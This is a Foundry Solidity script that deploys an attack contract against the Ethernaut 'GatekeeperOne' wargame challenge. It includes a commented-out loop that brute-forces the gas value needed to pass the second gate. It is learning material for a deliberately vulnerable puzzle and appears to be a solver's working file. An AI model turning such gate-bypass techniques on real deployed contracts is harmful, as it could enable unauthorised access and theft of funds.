// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GatekeeperOneHack.sol";
import "../src/GatekeeperOne.sol";

contract GatekeeperHackScript is Script {
  GatekeeperOneHack gatekeeperOneHackContract;
  address gatekeeperOneContract = 0x85aDc1a8e8c914F90b9aE41eadaB994801fFfe5B;
  function setUp() public {}
  
  // Test our GatekeeperOne hack against local fork to find the correct gas to call with on main
  event Failed(bytes reason, uint256 i);
  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(attacker);

    gatekeeperOneHackContract = new GatekeeperOneHack(address(gatekeeperOneContract));
    // for (uint256 i = 0; i <= 8191; i++) {
      // Arbitrary amount of gas close to target
      // try gatekeeperOneHackContract.enterGate(73976 + i) {
          // Break loop when solution found and log correct gas amount
          // console.log("Gate 2 gas to open gate: ", 73976 + i);
          // console.log("Gate 2 gas to open gate: ", 82166);
          // break;
      // } catch {} c
    // } 

    // console.log(gatekeeperOneContract.entrant());
    vm.stopBroadcast();
  }

}